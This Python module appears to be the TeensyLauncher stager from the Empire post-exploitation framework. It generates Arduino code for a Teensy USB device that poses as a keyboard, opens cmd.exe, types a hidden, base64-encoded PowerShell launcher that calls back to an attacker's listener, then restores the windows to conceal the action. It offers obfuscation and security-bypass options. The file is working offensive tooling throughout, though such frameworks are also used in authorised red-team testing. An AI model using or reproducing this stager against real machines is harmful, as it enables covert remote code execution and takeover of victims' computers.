import logging

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "TeensyLauncher",
            "Authors": [
                {
                    "Name": "Matt Hand",
                    "Handle": "@matterpreter",
                    "Link": "https://twitter.com/matterpreter",
                },
            ],
            "Description": "Generates a Teensy script that runes a one-liner stage0 launcher for Empire.",
            "Comments": [""],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "csharp", "ironpython"],
                "Strict": True,
            },
            "StagerRetries": {
                "Description": "Times for the stager to retry connecting.",
                "Required": False,
                "Value": "0",
            },
            "OutFile": {
                "Description": "File to output duckyscript to.",
                "Required": True,
                "Value": "/tmp/teensy.ino",
            },
            "Obfuscate": {
                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        # extract all of our options
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        stager_retries = self.options["StagerRetries"]["Value"]
        obfuscate = self.options["Obfuscate"]["Value"]
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]

        obfuscate_script = False
        if obfuscate.lower() == "true":
            obfuscate_script = True

        if language in ["csharp", "ironpython"]:
            if (
                self.mainMenu.listenersv2.get_active_listener_by_name(
                    listener_name
                ).info["Name"]
                != "HTTP[S]"
            ):
                log.error(
                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
                )
                return ""

            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner(
                language=language,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                encode=True,
                listener_name=listener_name,
            )
        elif language == "powershell":
            launcher = self.mainMenu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language=language,
                encode=True,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                stager_retries=stager_retries,
                bypasses=self.options["Bypasses"]["Value"],
            )

        if launcher == "":
            log.error("[!] Error in launcher command generation.")
            return ""

        enc = launcher.split(" ")[-1]
        send_enc = 'Keyboard.print("'
        send_enc += enc
        send_enc += '");\n'
        teensy_code = "unsigned int lock_check_wait = 1000;\n"
        teensy_code += "int ledKeys(void) {return int(keyboard_leds);}\n"
        teensy_code += "boolean isLockOn(void)  {\n"
        teensy_code += "    return ((ledKeys() & 2) == 2) ? true : false;\n"
        teensy_code += "}\n\n"
        teensy_code += "void clearKeys (){\n"
        teensy_code += "    delay(200);\n"
        teensy_code += "    Keyboard.set_key1(0);\n"
        teensy_code += "    Keyboard.set_key2(0);\n"
        teensy_code += "    Keyboard.set_key3(0);\n"
        teensy_code += "    Keyboard.set_key4(0);\n"
        teensy_code += "    Keyboard.set_key5(0);\n"
        teensy_code += "    Keyboard.set_key6(0);\n"
        teensy_code += "    Keyboard.set_modifier(0);\n"
        teensy_code += "    Keyboard.send_now();\n"
        teensy_code += "}\n\n"
        teensy_code += "void toggleLock(void) {\n"
        teensy_code += "    Keyboard.set_key1(KEY_CAPS_LOCK);\n"
        teensy_code += "    Keyboard.send_now();\n"
        teensy_code += "    clearKeys();\n"
        teensy_code += "}\n\n"
        teensy_code += "void wait_for_drivers(void) {\n"
        teensy_code += "    boolean numLockTrap = isLockOn();\n"
        teensy_code += "    while(numLockTrap == isLockOn()) {\n"
        teensy_code += "        toggleLock();\n"
        teensy_code += "        delay(lock_check_wait);\n"
        teensy_code += "    }\n"
        teensy_code += "    toggleLock();\n"
        teensy_code += "    delay(lock_check_wait);\n"
        teensy_code += "}\n\n"
        teensy_code += "void win_minWindows(void) {\n"
        teensy_code += "    delay(300);\n"
        teensy_code += "    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\n"
        teensy_code += "    Keyboard.set_key1(KEY_M);\n"
        teensy_code += "    Keyboard.send_now();\n"
        teensy_code += "    clearKeys();\n"
        teensy_code += "}\n\n"
        teensy_code += "void win_restoreWindows(void) {\n"
        teensy_code += "    delay(300);\n"
        teensy_code += "    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\n"
        teensy_code += "    Keyboard.send_now();\n"
        teensy_code += (
            "    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI | MODIFIERKEY_SHIFT);\n"
        )
        teensy_code += "    Keyboard.send_now();\n"
        teensy_code += "    Keyboard.set_key1(KEY_M);\n"
        teensy_code += "    Keyboard.send_now();\n"
        teensy_code += "    clearKeys();\n"
        teensy_code += "}\n\n"
        teensy_code += "void win_run(void) {\n"
        teensy_code += "    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);\n"
        teensy_code += "    Keyboard.set_key1(KEY_R);\n"
        teensy_code += "    Keyboard.send_now();\n"
        teensy_code += "    clearKeys();\n"
        teensy_code += "}\n\n"
        teensy_code += "void win_openCmd(void) {\n"
        teensy_code += "    delay(300);\n"
        teensy_code += "    win_run();\n"
        teensy_code += '    Keyboard.print("cmd.exe");\n'
        teensy_code += "    Keyboard.set_key1(KEY_ENTER);\n"
        teensy_code += "    Keyboard.send_now();\n"
        teensy_code += "    clearKeys();\n"
        teensy_code += "}\n\n"
        teensy_code += "void empire(void) {\n"
        teensy_code += "    wait_for_drivers();\n"
        teensy_code += "    win_minWindows();\n"
        teensy_code += "    delay(1000);\n"
        teensy_code += "    win_openCmd();\n"
        teensy_code += "    delay(1000);\n"
        teensy_code += '    Keyboard.print("powershell -W Hidden -nop -noni -enc ");\n'
        teensy_code += "    "
        teensy_code += send_enc
        teensy_code += "    Keyboard.set_key1(KEY_ENTER);\n"
        teensy_code += "    Keyboard.send_now();\n"
        teensy_code += "    clearKeys();\n"
        teensy_code += "    win_restoreWindows();\n"
        teensy_code += "}\n\n"
        teensy_code += "void setup(void) {\n"
        teensy_code += "    empire();\n"
        teensy_code += "}\n\n"
        teensy_code += "void loop() {}"

        return teensy_code
